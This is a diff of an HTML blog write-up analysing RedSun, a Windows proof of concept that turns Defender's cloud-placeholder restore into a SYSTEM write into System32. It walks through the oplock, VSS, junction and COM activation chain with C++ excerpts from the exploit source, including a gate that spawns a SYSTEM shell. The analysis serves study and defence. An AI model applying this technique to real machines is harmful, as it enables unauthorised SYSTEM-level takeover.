@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RedSun: When Windows Defender Defeats Itself — cyb3r-w0lf</title>
-<meta name="description" content="Deep dive into RedSun — a Windows privilege escalation exploit that turns Windows Defender's own remediation logic into a SYSTEM-privilege arbitrary write primitive, using VSS, oplocks, Cloud Files placeholders, and directory junctions.">
+<title>RedSun: When Windows Defender Defeats Itself - cyb3r-w0lf</title>
+<meta name="description" content="Deep dive into RedSun - a Windows privilege escalation exploit that turns Windows Defender's own remediation logic into a SYSTEM-privilege arbitrary write primitive, using VSS, oplocks, Cloud Files placeholders, and directory junctions.">
 <link rel="shortcut icon" href="../assets/img/front-face.png" type="image/x-icon">
 <meta property="og:title" content="RedSun: When Windows Defender Defeats Itself">
 <meta property="og:description" content="A Windows LPE that abuses Defender's cloud-placeholder restore behavior to achieve an arbitrary write in System32 and gain SYSTEM-level code execution.">
@@ -89,8 +89,9 @@ img{max-width:100%;height:auto;display:block;}
 .article-hero .inner{position:relative;}
 .section-tag{font-size:.72rem;color:var(--accent);opacity:.85;letter-spacing:.1em;display:inline-block;margin-bottom:14px;}
 .article-hero h1{
-  font-family:var(--display);font-size:clamp(1.7rem,4.5vw,2.6rem);font-weight:800;
-  letter-spacing:-.03em;line-height:1.2;margin-bottom:18px;color:var(--text);
+  font-family:var(--display);font-size:clamp(1.5rem,3.5vw,2.2rem);font-weight:800;
+  letter-spacing:-.03em;line-height:1.25;margin-bottom:18px;color:var(--text);
+  text-wrap:balance;
 }
 .article-hero h1 span{color:var(--accent);}
 .article-meta{display:flex;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:28px;}
@@ -132,14 +133,9 @@ img{max-width:100%;height:auto;display:block;}
 .section-heading{
   font-family:var(--display);font-size:1.35rem;font-weight:800;
   color:var(--text);letter-spacing:-.02em;margin-bottom:20px;
-  display:flex;align-items:center;gap:12px;
+  display:flex;align-items:center;gap:10px;
 }
-.section-heading .sh-num{
-  font-size:.72rem;font-family:var(--mono);color:var(--accent);
-  background:var(--accent-dim);border:1px solid var(--border2);
-  padding:2px 8px;border-radius:4px;
-}
-.section-heading .sh-icon{color:var(--accent);font-size:1rem;}
+.section-heading .sh-icon{color:var(--accent);font-size:1.1rem;flex-shrink:0;}
 .subsection{margin-bottom:40px;}
 .subsection-heading{
   font-family:var(--display);font-size:1.05rem;font-weight:700;
@@ -253,7 +249,9 @@ footer p{font-size:.72rem;color:var(--text3);}
   white-space:pre;overflow-x:auto;
 }
 .fig-caption{font-size:.72rem;color:var(--text3);margin-top:8px;text-align:center;}
-
+.copy-btn{font-family:var(--mono);font-size:.66rem;color:var(--text3);background:transparent;border:1px solid var(--border);border-radius:4px;padding:3px 9px;cursor:pointer;transition:all var(--transition);display:flex;align-items:center;gap:5px;}
+.copy-btn:hover{color:var(--accent);border-color:var(--border2);}
+.copy-btn.copied{color:var(--green);border-color:rgba(61,220,151,.3);}
 @media(max-width:640px){
   .site-header{padding:0 16px;}
   .article-hero,.article-body{padding-left:16px;padding-right:16px;}
@@ -293,7 +291,7 @@ footer p{font-size:.72rem;color:var(--text3);}
       <div class="tldr-card">
         <div class="tldr-label">// tl;dr</div>
         <p>
-          RedSun is a Windows privilege escalation proof-of-concept that weaponizes a design flaw in Windows Defender's interaction with the Cloud Files API. When Defender quarantines a malicious file and finds a Cloud Files placeholder at the same location, it writes the file's content back to that path — as SYSTEM. RedSun hijacks this write mid-flight by swapping the destination directory for a junction pointing to <span class="ic">C:\Windows\System32</span>, plants its own executable in place of a legitimate system service, then triggers that service via COM to obtain an interactive SYSTEM shell.
+          RedSun is a Windows privilege escalation proof-of-concept that weaponizes a design flaw in Windows Defender's interaction with the Cloud Files API. When Defender quarantines a malicious file and finds a Cloud Files placeholder at the same location, it writes the file's content back to that path - as SYSTEM. RedSun hijacks this write mid-flight by swapping the destination directory for a junction pointing to <span class="ic">C:\Windows\System32</span>, plants its own executable in place of a legitimate system service, then triggers that service via COM to obtain an interactive SYSTEM shell.
         </p>
       </div>
     </div>
@@ -330,13 +328,13 @@ footer p{font-size:.72rem;color:var(--text3);}
 
     <!-- ── SECTION 1: BACKGROUND ── -->
     <section class="article-section" id="background">
-      <h2 class="section-heading"><span class="sh-num">01</span> Background: The Building Blocks</h2>
-      <p>RedSun chains five distinct Windows mechanisms. Understanding each one individually makes the full exploit chain click into place. None of them are bugs on their own — the vulnerability emerges from how Windows Defender interacts with their combination.</p>
+      <h2 class="section-heading"><i class="sh-icon fa-solid fa-layer-group"></i> Background: The Building Blocks</h2>
+      <p>RedSun chains five distinct Windows mechanisms. Understanding each one individually makes the full exploit chain click into place. None of them are bugs on their own - the vulnerability emerges from how Windows Defender interacts with their combination.</p>
 
       <div class="subsection" id="oplocks">
         <h3 class="subsection-heading">Opportunistic Locks (Oplocks)</h3>
         <p>An <strong>opportunistic lock (oplock)</strong> is a kernel mechanism that lets a process ask the filesystem: "tell me before you let anyone else open this file." When another process tries to open the file in an incompatible way, the kernel <em>pauses</em> that second open request and notifies the oplock holder first, giving it a window of time to do work before the kernel lets the second opener in.</p>
-        <p>RedSun uses <strong>batch oplocks</strong> (<span class="ic">FSCTL_REQUEST_BATCH_OPLOCK</span>). These are the most aggressive type — they break on virtually any open attempt by another process. The exploit places batch oplocks in two places at two different moments, using them as precise timing hooks into Windows Defender's file access sequence.</p>
+        <p>RedSun uses <strong>batch oplocks</strong> (<span class="ic">FSCTL_REQUEST_BATCH_OPLOCK</span>). These are the most aggressive type - they break on virtually any open attempt by another process. The exploit places batch oplocks in two places at two different moments, using them as precise timing hooks into Windows Defender's file access sequence.</p>
         <div class="callout callout-info">
           <strong>Key point</strong>
           Think of an oplock as a doorbell. The oplock holder gets a ring the instant someone else reaches for the door. Everything the holder does before answering is a race-free window guaranteed by the kernel.
@@ -347,29 +345,29 @@ footer p{font-size:.72rem;color:var(--text3);}
         <h3 class="subsection-heading">Volume Shadow Copy Service (VSS)</h3>
         <p>The <strong>Volume Shadow Copy Service (VSS)</strong> creates point-in-time snapshots of NTFS volumes. When a snapshot is created, Windows exposes it as a virtual device under the Object Manager at a path like <span class="ic">\Device\HarddiskVolumeShadowCopyN</span>. Files on the volume at snapshot time are accessible read-only through this device path.</p>
         <p>Windows Defender uses VSS internally during malware remediation: before taking any destructive action on a detected file, it creates a shadow copy of the volume so it can safely read the file's content without triggering filesystem filters that the malware might have placed on the original path.</p>
-        <p>RedSun monitors the Object Manager's <span class="ic">\Device</span> directory using undocumented NT APIs to detect the exact moment a new shadow copy appears — which is the signal that Defender has started its remediation sequence.</p>
+        <p>RedSun monitors the Object Manager's <span class="ic">\Device</span> directory using undocumented NT APIs to detect the exact moment a new shadow copy appears - which is the signal that Defender has started its remediation sequence.</p>
       </div>
 
       <div class="subsection" id="cfapi">
         <h3 class="subsection-heading">Cloud Files API (CfApi)</h3>
-        <p>The <strong>Cloud Files API</strong> is what powers OneDrive's "Files On-Demand" feature. It lets applications register a directory as a <em>sync root</em> and create <em>placeholder files</em> within it. A placeholder looks and behaves like a real file to most of the operating system — it has a name, a size, timestamps — but its content may not be stored locally. The actual data lives "in the cloud" and is fetched on demand.</p>
-        <p>A placeholder marked with <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC</span> tells the Cloud Files filter driver that the file is fully synchronized with its cloud provider. Windows Defender treats such placeholders differently than locally-stored files — because from Defender's perspective, the authoritative copy of the data is remote, not on disk.</p>
+        <p>The <strong>Cloud Files API</strong> is what powers OneDrive's "Files On-Demand" feature. It lets applications register a directory as a <em>sync root</em> and create <em>placeholder files</em> within it. A placeholder looks and behaves like a real file to most of the operating system - it has a name, a size, timestamps - but its content may not be stored locally. The actual data lives "in the cloud" and is fetched on demand.</p>
+        <p>A placeholder marked with <span class="ic">CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC</span> tells the Cloud Files filter driver that the file is fully synchronized with its cloud provider. Windows Defender treats such placeholders differently than locally-stored files - because from Defender's perspective, the authoritative copy of the data is remote, not on disk.</p>
         <div class="callout callout-warn">
           <strong>The flaw in the logic</strong>
-          When Defender quarantines a malicious file that has a Cloud Files placeholder at the same path, it writes the file's content back to the placeholder location as part of its restore/remediation flow — running as SYSTEM. This is the behavior RedSun exploits.
+          When Defender quarantines a malicious file that has a Cloud Files placeholder at the same path, it writes the file's content back to the placeholder location as part of its restore/remediation flow - running as SYSTEM. This is the behavior RedSun exploits.
         </div>
       </div>
 
       <div class="subsection" id="junctions">
         <h3 class="subsection-heading">NTFS Directory Junctions</h3>
-        <p>An <strong>NTFS junction</strong> (also called a mount point) is a type of reparse point that transparently redirects all filesystem operations from one directory to another. If you set a junction on <span class="ic">C:\Foo</span> pointing to <span class="ic">C:\Windows\System32</span>, then opening <span class="ic">C:\Foo\notepad.exe</span> silently opens <span class="ic">C:\Windows\System32\notepad.exe</span> — without the caller knowing.</p>
-        <p>Junctions are normally used for things like disk volume mounting. RedSun abuses them to redirect Defender's SYSTEM-privileged write — originally aimed at a temp directory — into <span class="ic">C:\Windows\System32</span>.</p>
+        <p>An <strong>NTFS junction</strong> (also called a mount point) is a type of reparse point that transparently redirects all filesystem operations from one directory to another. If you set a junction on <span class="ic">C:\Foo</span> pointing to <span class="ic">C:\Windows\System32</span>, then opening <span class="ic">C:\Foo\notepad.exe</span> silently opens <span class="ic">C:\Windows\System32\notepad.exe</span> - without the caller knowing.</p>
+        <p>Junctions are normally used for things like disk volume mounting. RedSun abuses them to redirect Defender's SYSTEM-privileged write - originally aimed at a temp directory - into <span class="ic">C:\Windows\System32</span>.</p>
       </div>
 
       <div class="subsection" id="posixdelete">
         <h3 class="subsection-heading">POSIX Semantics File Deletion</h3>
-        <p>Windows normally prevents you from deleting a file while it has open handles — you must wait for all handles to close before the file name is freed. POSIX systems (Linux, macOS) have no such restriction: you can delete a file's directory entry immediately and open handles continue working, but new opens of that name will find nothing.</p>
-        <p>Windows NT exposes POSIX semantics via <span class="ic">NtSetInformationFile</span> with <span class="ic">FileDispositionInformationEx</span> and the flags <span class="ic">FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS</span>. RedSun uses this to free a filename instantly while its original handle is still open — making room for the Cloud Files placeholder to be created at the same path in the same moment.</p>
+        <p>Windows normally prevents you from deleting a file while it has open handles - you must wait for all handles to close before the file name is freed. POSIX systems (Linux, macOS) have no such restriction: you can delete a file's directory entry immediately and open handles continue working, but new opens of that name will find nothing.</p>
+        <p>Windows NT exposes POSIX semantics via <span class="ic">NtSetInformationFile</span> with <span class="ic">FileDispositionInformationEx</span> and the flags <span class="ic">FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS</span>. RedSun uses this to free a filename instantly while its original handle is still open - making room for the Cloud Files placeholder to be created at the same path in the same moment.</p>
       </div>
     </section>
 
@@ -377,7 +375,7 @@ footer p{font-size:.72rem;color:var(--text3);}
 
     <!-- ── SECTION 2: THE BUG ── -->
     <section class="article-section" id="thebug">
-      <h2 class="section-heading"><span class="sh-num">02</span> The Windows Defender Design Flaw</h2>
+      <h2 class="section-heading"><i class="sh-icon fa-solid fa-shield-halved"></i> The Windows Defender Design Flaw</h2>
 
       <p>Here is the core behavior being abused, stated plainly:</p>
 
@@ -392,28 +390,28 @@ footer p{font-size:.72rem;color:var(--text3);}
         <div class="step-card">
           <div class="step-num">1</div>
           <div class="step-body">
-            <h4>Snapshot — Create a VSS Shadow Copy</h4>
+            <h4>Snapshot - Create a VSS Shadow Copy</h4>
             <p>Before touching the malicious file, Defender creates a VSS snapshot of the volume. This gives it a stable, read-only copy of the file's content that no filesystem hook or ransomware trick can tamper with.</p>
           </div>
         </div>
         <div class="step-card">
           <div class="step-num">2</div>
           <div class="step-body">
-            <h4>Read — Pull the Malicious Content from VSS</h4>
+            <h4>Read - Pull the Malicious Content from VSS</h4>
             <p>Defender reads the file's content from the VSS snapshot path (<span class="ic">\Device\HarddiskVolumeShadowCopyN\...</span>) rather than the live path, for safety.</p>
           </div>
         </div>
         <div class="step-card">
           <div class="step-num">3</div>
           <div class="step-body">
-            <h4>Quarantine — Remove the File from Its Original Location</h4>
+            <h4>Quarantine - Remove the File from Its Original Location</h4>
             <p>Defender moves the malicious file to its quarantine store and removes it from the original path.</p>
           </div>
         </div>
         <div class="step-card">
           <div class="step-num">4</div>
           <div class="step-body">
-            <h4>Restore — Write Back to the Original Path</h4>
+            <h4>Restore - Write Back to the Original Path</h4>
             <p>If a Cloud Files placeholder remains at the original path, Defender writes the file's content back to it. This is the self-defeating step: the antivirus puts the file it just removed back in place, because it interprets the placeholder as a cloud-synced file that needs to be locally present.</p>
           </div>
         </div>
@@ -426,7 +424,7 @@ footer p{font-size:.72rem;color:var(--text3);}
 
     <!-- ── SECTION 3: ATTACK CHAIN ── -->
     <section class="article-section" id="chain">
-      <h2 class="section-heading"><span class="sh-num">03</span> The Attack Chain, Step by Step</h2>
+      <h2 class="section-heading"><i class="sh-icon fa-solid fa-diamond-turn-right"></i> The Attack Chain, Step by Step</h2>
 
       <p>Below is the complete exploit chain. Each phase builds on the previous one. The numbered steps match the order they execute in the source code.</p>
 
@@ -434,63 +432,63 @@ footer p{font-size:.72rem;color:var(--text3);}
       <div class="chain">
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 0 — Second-Stage Gate</strong><span>Global initializer checks: am I SYSTEM? If yes, spawn shell and exit. This gate fires before main().</span></div>
+          <div class="chain-text"><strong>Phase 0 - Second-Stage Gate</strong><span>Global initializer checks: am I SYSTEM? If yes, spawn shell and exit. This gate fires before main().</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 1 — Setup &amp; Named Pipe</strong><span>Create named pipe REDSUN. Create temp work directory. Launch VSS watcher thread.</span></div>
+          <div class="chain-text"><strong>Phase 1 - Setup &amp; Named Pipe</strong><span>Create named pipe REDSUN. Create temp work directory. Launch VSS watcher thread.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 2 — EICAR Trigger</strong><span>Write the EICAR test string to a file named TieringEngineService.exe in the temp dir. Open it with FILE_EXECUTE to trigger Defender's real-time scanner.</span></div>
+          <div class="chain-text"><strong>Phase 2 - EICAR Trigger</strong><span>Write the EICAR test string to a file named TieringEngineService.exe in the temp dir. Open it with FILE_EXECUTE to trigger Defender's real-time scanner.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 3 — First Oplock: VSS Timing</strong><span>Defender creates a VSS snapshot. The watcher thread detects it, opens the file's copy inside the snapshot, and places a batch oplock on it. Main thread waits for this signal.</span></div>
+          <div class="chain-text"><strong>Phase 3 - First Oplock: VSS Timing</strong><span>Defender creates a VSS snapshot. The watcher thread detects it, opens the file's copy inside the snapshot, and places a batch oplock on it. Main thread waits for this signal.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 4 — POSIX Delete + Cloud Placeholder</strong><span>The original EICAR file is POSIX-deleted (name freed immediately). A Cloud Files placeholder is created at the same path. The oplock on the VSS copy is released, letting Defender read from VSS and proceed with quarantine.</span></div>
+          <div class="chain-text"><strong>Phase 4 - POSIX Delete + Cloud Placeholder</strong><span>The original EICAR file is POSIX-deleted (name freed immediately). A Cloud Files placeholder is created at the same path. The oplock on the VSS copy is released, letting Defender read from VSS and proceed with quarantine.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 5 — Rebuild Directory &amp; Second Oplock</strong><span>The work directory is moved aside and recreated clean. A new file is created at the same path and a second batch oplock is placed on it. A memory-mapped section pins the file to prevent premature deletion.</span></div>
+          <div class="chain-text"><strong>Phase 5 - Rebuild Directory &amp; Second Oplock</strong><span>The work directory is moved aside and recreated clean. A new file is created at the same path and a second batch oplock is placed on it. A memory-mapped section pins the file to prevent premature deletion.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 6 — Junction Swap at Oplock Break</strong><span>Defender's restore write breaks the second oplock. In the kernel-guaranteed window: the file is renamed away, and the work directory is converted into a junction pointing to C:\Windows\System32.</span></div>
+          <div class="chain-text"><strong>Phase 6 - Junction Swap at Oplock Break</strong><span>Defender's restore write breaks the second oplock. In the kernel-guaranteed window: the file is renamed away, and the work directory is converted into a junction pointing to C:\Windows\System32.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 7 — Defender Writes to System32</strong><span>The oplock is acknowledged by closing the file handle. Defender's blocked open resumes, now resolving through the junction to System32\TieringEngineService.exe. Defender writes there as SYSTEM.</span></div>
+          <div class="chain-text"><strong>Phase 7 - Defender Writes to System32</strong><span>The oplock is acknowledged by closing the file handle. Defender's blocked open resumes, now resolving through the junction to System32\TieringEngineService.exe. Defender writes there as SYSTEM.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 8 — Binary Replacement</strong><span>A write loop races to open System32\TieringEngineService.exe. Once the handle is obtained, CopyFile overwrites the binary with the RedSun executable itself.</span></div>
+          <div class="chain-text"><strong>Phase 8 - Binary Replacement</strong><span>A write loop races to open System32\TieringEngineService.exe. Once the handle is obtained, CopyFile overwrites the binary with the RedSun executable itself.</span></div>
         </div>
         <div class="chain-item">
           <div class="chain-arrow"><div class="chain-dot"></div><div class="chain-line"></div></div>
-          <div class="chain-text"><strong>Phase 9 — COM Activation → SYSTEM</strong><span>CoCreateInstance activates the Storage Tiers Management COM server. Windows launches the registered binary (now RedSun.exe) as SYSTEM. The second-stage gate fires, spawning an interactive SYSTEM console in the user's session.</span></div>
+          <div class="chain-text"><strong>Phase 9 - COM Activation → SYSTEM</strong><span>CoCreateInstance activates the Storage Tiers Management COM server. Windows launches the registered binary (now RedSun.exe) as SYSTEM. The second-stage gate fires, spawning an interactive SYSTEM console in the user's session.</span></div>
         </div>
       </div>
 
-      <p>The elegance of this chain is that the most privileged operation — writing into System32 — is performed by Windows Defender itself. The exploit never directly touches System32 until after the write path has been redirected.</p>
+      <p>The elegance of this chain is that the most privileged operation - writing into System32 - is performed by Windows Defender itself. The exploit never directly touches System32 until after the write path has been redirected.</p>
     </section>
 
     <hr class="section-divider">
 
     <!-- ── SECTION 4: CODE DEEP DIVE ── -->
     <section class="article-section" id="codedive">
-      <h2 class="section-heading"><span class="sh-num">04</span> Code Deep Dive</h2>
+      <h2 class="section-heading"><i class="sh-icon fa-solid fa-code"></i> Code Deep Dive</h2>
 
       <!-- 4.1 Second-Stage Gate -->
       <div class="subsection" id="code-stagegate">
-        <h3 class="subsection-heading">4.1 — The Second-Stage Gate</h3>
-        <p>Before <span class="ic">main()</span> runs, C++ initializes global variables. RedSun exploits this to install a silent second-stage check that fires every time the binary runs — including when SYSTEM runs it as a COM server:</p>
+        <h3 class="subsection-heading">4.1 - The Second-Stage Gate</h3>
+        <p>Before <span class="ic">main()</span> runs, C++ initializes global variables. RedSun exploits this to install a silent second-stage check that fires every time the binary runs - including when SYSTEM runs it as a COM server:</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — global scope</span></div>
-          <pre><code><span class="hl-cm">// Line 576 — runs BEFORE main(), as part of CRT global initialization</span>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - global scope</span></div>
+          <pre><code><span class="hl-cm">// Line 576 - runs BEFORE main(), as part of CRT global initialization</span>
 <span class="hl-type">bool</span> r = <span class="hl-fn">IsRunningAsLocalSystem</span>();
 
 <span class="hl-type">bool</span> <span class="hl-fn">IsRunningAsLocalSystem</span>()
@@ -506,23 +504,23 @@ footer p{font-size:.72rem;color:var(--text3);}
     <span class="hl-type">bool</span> ret = <span class="hl-fn">IsWellKnownSid</span>(tokenuser-&gt;User.Sid, WinLocalSystemSid);
     <span class="hl-kw">if</span> (ret) {
         <span class="hl-fn">LaunchConsoleInSessionId</span>();   <span class="hl-cm">// spawn SYSTEM shell in user's session</span>
-        <span class="hl-fn">ExitProcess</span>(<span class="hl-num">0</span>);               <span class="hl-cm">// done — never reaches main()</span>
+        <span class="hl-fn">ExitProcess</span>(<span class="hl-num">0</span>);               <span class="hl-cm">// done - never reaches main()</span>
     }
     <span class="hl-kw">return</span> ret;
 }</code></pre>
         </div>
 
-        <p>When the first-stage exploit replaces <span class="ic">TieringEngineService.exe</span> in System32 with the RedSun binary and triggers it via COM, Windows starts the binary as SYSTEM. The global initializer fires first, detects the SYSTEM context, delivers the shell, and exits — cleanly, without ever touching <span class="ic">main()</span>.</p>
+        <p>When the first-stage exploit replaces <span class="ic">TieringEngineService.exe</span> in System32 with the RedSun binary and triggers it via COM, Windows starts the binary as SYSTEM. The global initializer fires first, detects the SYSTEM context, delivers the shell, and exits - cleanly, without ever touching <span class="ic">main()</span>.</p>
       </div>
 
       <!-- 4.2 VSS Watcher Thread -->
       <div class="subsection" id="code-vssthread">
-        <h3 class="subsection-heading">4.2 — VSS Watcher Thread</h3>
+        <h3 class="subsection-heading">4.2 - VSS Watcher Thread</h3>
         <p>The VSS watcher thread runs in parallel with the rest of the exploit. Its job: detect the moment Windows Defender creates a shadow copy, then place an oplock on the file's copy inside that snapshot.</p>
-        <p>It monitors the Object Manager directory <span class="ic">\Device</span> using two undocumented NT functions — <span class="ic">NtOpenDirectoryObject</span> and <span class="ic">NtQueryDirectoryObject</span> — which let a usermode process enumerate the kernel's object namespace directly. The thread takes a baseline snapshot of all existing <span class="ic">HarddiskVolumeShadowCopy*</span> devices, then polls in a loop until it finds one that wasn't in the baseline.</p>
+        <p>It monitors the Object Manager directory <span class="ic">\Device</span> using two undocumented NT functions - <span class="ic">NtOpenDirectoryObject</span> and <span class="ic">NtQueryDirectoryObject</span> - which let a usermode process enumerate the kernel's object namespace directly. The thread takes a baseline snapshot of all existing <span class="ic">HarddiskVolumeShadowCopy*</span> devices, then polls in a loop until it finds one that wasn't in the baseline.</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — ShadowCopyFinderThread (simplified)</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - ShadowCopyFinderThread (simplified)</span></div>
           <pre><code><span class="hl-cm">// 1. Baseline: enumerate all current shadow copies</span>
 LLShadowVolumeNames* vsinitial = <span class="hl-fn">RetrieveCurrentVSSList</span>(hobjdir, &amp;criterr, &amp;vscnum);
 
@@ -545,7 +543,7 @@ retry:
 stat = <span class="hl-fn">NtCreateFile</span>(&amp;hlk, DELETE | SYNCHRONIZE, &amp;objattr2, ...);
 <span class="hl-kw">if</span> (stat == STATUS_NO_SUCH_DEVICE) <span class="hl-kw">goto</span> retry;
 
-<span class="hl-cm">// 5. Place batch oplock — breaks when Defender opens this VSS copy</span>
+<span class="hl-cm">// 5. Place batch oplock - breaks when Defender opens this VSS copy</span>
 <span class="hl-fn">DeviceIoControl</span>(hlk, FSCTL_REQUEST_BATCH_OPLOCK, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, <span class="hl-kw">NULL</span>, &amp;ovd);
 
 <span class="hl-cm">// 6. Signal main thread: "oplock is in place, you can proceed"</span>
@@ -558,26 +556,26 @@ stat = <span class="hl-fn">NtCreateFile</span>(&amp;hlk, DELETE | SYNCHRONIZE, &
 <span class="hl-cm">// 8. Wait for main to signal "I've set up the placeholder, you can release"</span>
 <span class="hl-fn">WaitForSingleObject</span>(gevent, INFINITE);
 
-<span class="hl-cm">// 9. Release the VSS oplock — Defender can now read from VSS</span>
+<span class="hl-cm">// 9. Release the VSS oplock - Defender can now read from VSS</span>
 <span class="hl-fn">CloseHandle</span>(hlk);
 <span class="hl-fn">WakeByAddressAll</span>(&amp;gevent);  <span class="hl-cm">// unblock main's WaitOnAddress</span></code></pre>
         </div>
 
-        <p>The batch oplock on the VSS file serves as a timing gate: Defender is frozen the instant it tries to read from the shadow copy. This gives the main thread uninterrupted time to POSIX-delete the original file and create the Cloud Files placeholder in its place — before Defender has had a chance to do anything with the content it read.</p>
+        <p>The batch oplock on the VSS file serves as a timing gate: Defender is frozen the instant it tries to read from the shadow copy. This gives the main thread uninterrupted time to POSIX-delete the original file and create the Cloud Files placeholder in its place - before Defender has had a chance to do anything with the content it read.</p>
 
         <div class="callout callout-info">
           <strong>Why does Defender read from VSS at all?</strong>
-          When Defender's WdFilter.sys minifilter detects a malicious file, it opens a copy of the file from the VSS snapshot rather than the live path. This protects against a class of malware that intercepts file reads on the live path using filesystem filter drivers to return clean-looking data to the scanner. By going through VSS, Defender bypasses any such filter. RedSun turns this protection against Defender — the VSS path is exactly where the first oplock is placed.
+          When Defender's WdFilter.sys minifilter detects a malicious file, it opens a copy of the file from the VSS snapshot rather than the live path. This protects against a class of malware that intercepts file reads on the live path using filesystem filter drivers to return clean-looking data to the scanner. By going through VSS, Defender bypasses any such filter. RedSun turns this protection against Defender - the VSS path is exactly where the first oplock is placed.
         </div>
       </div>
 
       <!-- 4.3 EICAR Trigger -->
       <div class="subsection" id="code-eicar">
-        <h3 class="subsection-heading">4.3 — EICAR Trigger</h3>
-        <p>To launch the exploit, something malicious must be written to disk so that Defender's real-time scanner triggers. RedSun uses the <strong>EICAR test string</strong> — a standardized, harmless string that every antivirus is required to flag, making it the ideal tool for reliably triggering AV behavior in a controlled PoC without deploying actual malware.</p>
+        <h3 class="subsection-heading">4.3 - EICAR Trigger</h3>
+        <p>To launch the exploit, something malicious must be written to disk so that Defender's real-time scanner triggers. RedSun uses the <strong>EICAR test string</strong> - a standardized, harmless string that every antivirus is required to flag, making it the ideal tool for reliably triggering AV behavior in a controlled PoC without deploying actual malware.</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — main()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - main()</span></div>
           <pre><code><span class="hl-cm">// EICAR is stored reversed so the compiled binary itself isn't flagged</span>
 <span class="hl-type">char</span> eicar[] = <span class="hl-str">"*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X"</span>;
 <span class="hl-fn">rev</span>(eicar);   <span class="hl-cm">// reverse in-place at runtime → standard EICAR string</span>
@@ -591,16 +589,16 @@ DWORD nwf = <span class="hl-num">0</span>;
 
         <p>The EICAR string is embedded <em>reversed</em> in the source code. If it were stored forward, the compiled binary itself would contain the EICAR signature in its <span class="ic">.rdata</span> section and would be detected and quarantined before the exploit could run. By reversing it and calling <span class="ic">rev()</span> at runtime, the binary stays clean on disk while the string is reconstructed in memory just before it is written to the trigger file.</p>
 
-        <p>Opening the file with <span class="ic">FILE_EXECUTE</span> — rather than a plain read or write — is what triggers Defender's on-access scan. The Windows filesystem filter manager interprets execute access as a pre-execution check, causing WdFilter.sys to inspect the file synchronously before returning control to the caller.</p>
+        <p>Opening the file with <span class="ic">FILE_EXECUTE</span> - rather than a plain read or write - is what triggers Defender's on-access scan. The Windows filesystem filter manager interprets execute access as a pre-execution check, causing WdFilter.sys to inspect the file synchronously before returning control to the caller.</p>
       </div>
 
       <!-- 4.4 Cloud Files Placeholder -->
       <div class="subsection" id="code-placeholder">
-        <h3 class="subsection-heading">4.4 — POSIX Delete &amp; Cloud Files Placeholder</h3>
-        <p>With the first oplock in place (the VSS watcher is holding Defender frozen), the main thread deletes the original EICAR file and replaces its name with a Cloud Files placeholder — all before Defender's read completes.</p>
+        <h3 class="subsection-heading">4.4 - POSIX Delete &amp; Cloud Files Placeholder</h3>
+        <p>With the first oplock in place (the VSS watcher is holding Defender frozen), the main thread deletes the original EICAR file and replaces its name with a Cloud Files placeholder - all before Defender's read completes.</p>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — main()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - main()</span></div>
           <pre><code><span class="hl-cm">// POSIX-semantics delete: free the filename IMMEDIATELY (not on handle close)</span>
 <span class="hl-cm">// 0x1 = FILE_DISPOSITION_DELETE</span>
 <span class="hl-cm">// 0x2 = FILE_DISPOSITION_POSIX_SEMANTICS</span>
@@ -613,7 +611,7 @@ FILE_DISPOSITION_INFORMATION_EX fdiex = { <span class="hl-num">0x00000001</span>
         </div>
 
         <div class="code-block">
-          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp — DoCloudStuff()</span></div>
+          <div class="cb-header"><span class="cb-lang">cpp</span><span class="cb-file">RedSun.cpp - DoCloudStuff()</span></div>
           <pre><code><span class="hl-cm">// Register the work directory as a Cloud Files sync root</span>
 CF_SYNC_REGISTRATION cfreg = { <span class="hl-num">0</span> };
 cfreg.StructSize = <span class="hl-kw">sizeof</span>(CF_SYNC_REGISTRATION);
@@ -623,24 +621,24 @@ cfreg.ProviderVersion = <span class="hl-str">L"1.0"</span>;
